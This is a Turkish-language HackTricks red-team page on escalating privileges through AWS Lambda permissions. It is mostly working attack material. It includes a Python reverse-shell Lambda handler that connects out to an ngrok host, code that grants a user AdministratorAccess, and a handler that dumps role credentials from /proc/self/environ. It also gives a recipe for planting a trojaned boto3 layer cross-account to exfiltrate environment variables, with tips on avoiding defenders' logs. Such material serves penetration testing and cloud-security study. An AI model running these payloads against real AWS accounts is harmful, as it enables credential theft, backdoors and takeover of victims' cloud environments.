# AWS - Lambda Privilege Escalation

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

## lambda

Lambda hakkında daha fazla bilgi için:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction` ve `lambda:InvokeFunction`** izinlerine sahip kullanıcılar ayrıcalıklarını yükseltebilir.\
Bu kullanıcılar, **mevcut bir IAM rolüne sahip yeni bir Lambda işlevi oluşturabilir** ve bu işleve bu rolle ilişkilendirilen izinleri verebilir. Kullanıcı daha sonra bu Lambda işlevine **kod yazabilir ve yükleyebilir (örneğin, bir ters kabuk)**.\
İşlev kurulduktan sonra, kullanıcı AWS API'si aracılığıyla Lambda işlevini çağırarak işlevin çalışmasını tetikleyebilir ve istenen eylemleri gerçekleştirebilir. Bu yaklaşım, kullanıcının IAM rolüyle ilişkilendirilen erişim düzeyiyle dolaylı olarak görevleri gerçekleştirmesine olanak tanır.\

Bir saldırgan, bu yöntemi kullanarak bir **ters kabuk alabilir ve belirteci çalabilir**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Ayrıca, lambda işlevinden lambda rol izinlerini **kötüye kullanabilirsiniz**.\
Lambda rolü yeterli izinlere sahipse, sizin için yönetici hakları vermek için bunu kullanabilirsiniz:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Lambda'nın rol kimlik bilgilerini harici bir bağlantıya ihtiyaç duymadan sızdırmak da mümkündür. Bu, iç görevlerde kullanılan **Ağ izole Lambda'lar** için faydalı olabilir. Eğer ters kabukları filtreleyen bilinmeyen güvenlik grupları varsa, bu kod parçası, lambda'nın çıktısı olarak kimlik bilgilerini doğrudan sızdırmanıza olanak sağlar.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potansiyel Etki:** Belirtilen keyfi lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

{% hint style="danger" %}
Unutmayın ki, **`lambda:InvokeAsync`** tek başına **`aws lambda invoke-async`** komutunu çalıştırmaya izin vermez, ayrıca `lambda:InvokeFunction` iznine de ihtiyacınız vardır.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Önceki senaryoda olduğu gibi, **`lambda:AddPermission`** iznine sahipseniz, kendinize **`lambda:InvokeFunction`** iznini verebilirsiniz.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potansiyel Etki:** Belirtilen keyfi lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction` ve `lambda:CreateEventSourceMapping`** izinlerine sahip kullanıcılar (ve potansiyel olarak `dynamodb:PutItem` ve `dynamodb:CreateTable`), `lambda:InvokeFunction` olmadan bile dolaylı olarak **ayrıcalıkları yükseltebilir**.
Kötü amaçlı kod içeren bir Lambda işlevi oluşturabilir ve mevcut bir IAM rolüne atayabilirler.

Lambda'yı doğrudan çağırmak yerine, kullanıcı bir DynamoDB tablosu kurar veya mevcut bir tabloyu kullanır ve Lambda'yı bir olay kaynağı eşlemesi aracılığıyla tabloya bağlar. Bu kurulum, Lambda işlevinin tabloya yeni bir öğe girişiyle otomatik olarak tetiklendiğinden, kullanıcının eylemi veya başka bir işlemle dolaylı olarak Lambda işlevini çağırır ve geçilen IAM rolünün izinleriyle kodu yürütür.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Eğer DynamoDB zaten AWS ortamında etkinse, kullanıcının sadece Lambda işlevi için etkinlik kaynağı eşlemesini kurması gerekmektedir. Ancak, DynamoDB kullanılmıyorsa, kullanıcının etkinleştirilmiş bir akışa sahip yeni bir tablo oluşturması gerekmektedir:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Şimdi, Lambda işlevini DynamoDB tablosuna bağlamak mümkün, bunun için bir olay kaynağı eşlemesi oluşturarak yapılır:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda fonksiyonu, DynamoDB akışına bağlandığında, saldırgan DynamoDB akışını etkinleştirerek Lambda'yı **dolaylı olarak tetikleyebilir**. Bunun için DynamoDB tablosuna bir öğe **eklemek** yeterlidir:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potansiyel Etki:** Belirtilen lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `lambda:AddPermission`

Bu izne sahip bir saldırgan, kendisine (veya başkalarına) herhangi bir izin verebilir (bu, kaynağa erişim izni vermek için kaynak tabanlı politikalar oluşturur):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potansiyel Etki:** Kodu değiştirme ve çalıştırma izni vererek, lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `lambda:AddLayerVersionPermission`

Bu izne sahip bir saldırgan, kendisine (veya başkalarına) `lambda:GetLayerVersion` iznini **verebilir**. Katmana erişebilir ve zafiyetleri veya hassas bilgileri arayabilir.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potansiyel Etki:** Hassas bilgilere erişim olasılığı.

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** iznine sahip kullanıcılar, bir IAM rolüne bağlı olan mevcut bir Lambda işlevinin kodunu değiştirme potansiyeline sahiptir.\
Saldırgan, IAM kimlik bilgilerini dışarı çıkarmak için lambdanın kodunu değiştirebilir.

Saldırganın işlevi doğrudan çağırma yeteneği olmasa da, Lambda işlevi önceden var olan ve çalışır durumdaysa, mevcut iş akışları veya olaylar aracılığıyla tetikleneceği olasıdır, bu da değiştirilmiş kodun yürütülmesini dolaylı olarak kolaylaştırır.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potansiyel Etki:** Kullanılan lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `lambda:UpdateFunctionConfiguration`

#### Giriş

[**Lambda Katmanları**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html), lambda işlevinize **kodu** dahil etmenizi sağlar, ancak kodu ayrı bir şekilde **saklar**, böylece işlev kodu küçük kalabilir ve **birkaç işlev kodu paylaşabilir**.

Lambda içinde, aşağıdaki gibi bir işlevle python kodunun yüklendiği yolları kontrol edebilirsiniz:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
İşte bu yerler:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Örneğin, boto3 kütüphanesi `/var/runtime/boto3` (4. konum) konumundan yüklenir.

#### Sömürü

**Bir katmanı bir işleve eklemek**, yalnızca `lambda:UpdateFunctionConfiguration` iznine ihtiyaç duyar ve **katmanlar hesaplar arası paylaşılabilir**. Ayrıca, **hangi kütüphaneleri kullandıklarını** bilmemiz gerekecektir, böylece doğru bir şekilde üzerine yazabiliriz, ancak bu örnekte, saldırıya uğrayan işlevin boto3'ü içe aktardığını varsayacağız.

Güvende olmak için, hedeflediğimiz Lambda çalışma zamanından (Python 3.7) boto3 kütüphanesinin aynı sürümünü yüklemek için Pip'i kullanacağız, böylece hedef işlevde sorunlara neden olabilecek farklı bir şey olmaz. Şu anda bu çalışma zamanı boto3 sürümü 1.9.42 kullanıyor.

Aşağıdaki kodla, boto3 sürüm 1.9.42 ve bağımlılıklarını yerel bir "lambda\_layer" klasörüne yükleyeceğiz:
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
Sonraki adımda, `/lambda_layer/boto3/__init__.py` dosyasını açacak ve kötü amaçlı kodu ekleyeceğiz. Ekleyeceğimiz payload aşağıdaki gibi görünecektir:

![](<../../../.gitbook/assets/image (26).png>)

`requests`, `botocore` tarafından içe aktarılıyor. Bu işlev, çevre değişkenlerini dışarıya aktaracak ve try-except ve 0.1 zaman aşımı, bu kodun herhangi bir şeyi bozmadığından emin olmak için kullanılıyor.

{% hint style="info" %}
**Önemli not:** Gerçek pentestlerde artık `from botocore.vendored import requests` kullanmamalısınız, çünkü bu işlevin CloudWatch günlüklerine "DeprecationWarning" yazdırılacak ve muhtemelen bir savunucu tarafından yakalanmanıza neden olacaktır.
{% endhint %}

Şimdi, bu kodu bir **ZIP dosyasına** paketleyin ve onu **SALDIRGAN hesabında yeni bir Lambda katmanına yükleyin**. İlk olarak bir "python" klasörü oluşturmanız ve kütüphanelerinizi oraya koymalısınız, böylece Lambda'ya yüklediğimizde kod " /opt/python/boto3" konumunda bulunur. Ayrıca, katmanın Python 3.7 ile uyumlu olduğundan ve **katmanın hedef işlevimizle aynı bölgede olduğundan** emin olun. Bunlar tamamlandıktan sonra, hedef hesabımızın bunu kullanabilmesi için `lambda:AddLayerVersionPermission` kullanarak katmanı **genel olarak erişilebilir** hale getireceğiz. Bu API çağrısı için kişisel AWS kimlik bilgilerinizi kullanın.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Şimdi sahip olduğumuz **ele geçirilmiş kimlik bilgileri** ile hedef Lambda fonksiyonumuz "s3-getter" üzerinde aşağıdaki komutu çalıştıracağız, bu da **çapraz hesap Lambda katmanımızı ekleyecektir**.
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
Bir sonraki adım, **fonksiyonu kendimiz çağırabiliyorsak** çağırmak veya normal yollarla çağrıldığında beklemektir - bu daha güvenli bir yöntemdir.

Bu zafiyeti **daha gizli bir şekilde** kullanmanın bir yolu şurada bulunabilir:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potansiyel Etki:** Kullanılan lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Belki bu izinlerle bir fonksiyon oluşturabilir ve URL'yi çağırarak çalıştırabilirsiniz... ama bunu test etmek için bir yol bulamadım, bu yüzden yapabilirseniz bana bildirin!

### Lambda MitM

Bazı lambda fonksiyonları, kullanıcılardan parametreler aracılığıyla **duyarlı bilgiler alacak**. Bir tanesinde RCE elde ederseniz, diğer kullanıcıların ona gönderdiği bilgileri çalabilirsiniz, bunu kontrol edin:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Referanslar

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ile sıfırdan kahraman olmak için AWS hackleme öğrenin</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **tanıtmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>
